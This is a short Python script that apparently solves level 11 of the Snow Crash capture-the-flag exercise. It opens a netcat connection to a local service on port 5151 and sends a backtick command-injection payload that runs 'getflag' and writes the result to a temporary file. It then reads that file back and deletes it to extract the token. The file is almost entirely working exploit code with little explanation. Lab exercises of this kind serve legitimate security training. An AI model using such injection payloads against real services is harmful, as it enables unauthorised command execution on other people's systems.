"""LEVEL 11"""

import utils as u
from utils.level_wrapper import level_handler


@level_handler
def solve_level11(_, snow_crash):
    """Inject command via TCP data transfer"""

    proc = snow_crash.process(["/bin/nc", "localhost", "5151"])
    proc.sendline("`getflag` > /tmp/token11")
    output = snow_crash["cat /tmp/token11; rm -f /tmp/token11"]
    return "token", u.misc.parse_token(output)
